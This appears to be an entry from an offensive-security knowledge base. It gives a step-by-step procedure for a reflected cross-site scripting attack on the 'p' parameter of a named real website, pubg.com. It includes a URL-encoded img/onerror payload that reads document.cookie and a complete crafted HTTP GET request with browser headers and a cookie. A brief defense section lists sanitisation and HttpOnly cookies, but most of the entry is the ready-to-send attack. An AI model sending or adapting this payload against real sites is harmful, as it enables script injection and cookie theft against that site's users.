---
id: proc-inject-xss-payload-751870
tags:
  - xss
  - injection
  - url-encoding
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/crafted-get-request-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:37.978Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Payload-into-Vulnerable-Parameter

## Summary

This procedure encodes an XSS payload and injects it into the 'p' GET parameter of pubg.com, crafting a malicious HTTP request that, when reflected, executes JavaScript in the browser.

## Description

The vulnerability stems from improper sanitization of the 'p' parameter, allowing direct reflection of user input into the HTML response. The procedure involves URL-encoding the payload (e.g., using an <img> tag with onerror to trigger the script) and simulating a browser request with appropriate headers. This targets web applications vulnerable to reflected XSS. Prerequisites: Knowledge of HTTP requests and encoding tools. Outcomes: Malicious URL ready for delivery, with script execution upon access.

## Requirements

1. URL encoder (built-in browser tools or online)
2. Access to send HTTP requests (browser or curl)
3. Target URL: https://www.pubg.com/

## Defense

Defensive measures and detection strategies:

- Validate and sanitize GET parameters server-side, rejecting suspicious characters like '<' or 'onerror'
- Use HTTP-only and secure flags on cookies to prevent JavaScript access
- Log and alert on requests with encoded payloads via intrusion detection systems (IDS)

## Objectives

1. Encode payload to bypass basic filters
2. Form complete HTTP request exploiting the parameter
3. Confirm reflection in response

## Instructions

### Step 1: Encode the Payload

**Context**: Wrap the JavaScript in an HTML-breaking tag and encode for URL safety.

Construct the encoded string: iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq

> This breaks out of the parameter context with ' >' and injects an <img> tag that errors to execute the alert.

### Step 2: Craft and Send HTTP Request

**Context**: Assemble the full GET request with headers mimicking a browser.

**Command** ([[commands/crafted-get-request-xss]]):
```http
GET /?p=iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq HTTP/1.1
Host: www.pubg.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: https://www.pubg.com/es/feed/
Cookie: _icl_current_language=en; _icl_visitor_lang_js=en-us; wpml_browser_redirect_test=0; __cfduid=de74423d435717d651b1c9e2c63f4acc21575460678
```

> Send via browser URL bar or tool like curl. Expected output: Page loads with reflected payload in source, triggering script on error.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/crafted-get-request-xss]]

## Tools Used


## Tags

- [[xss]]
- [[injection]]
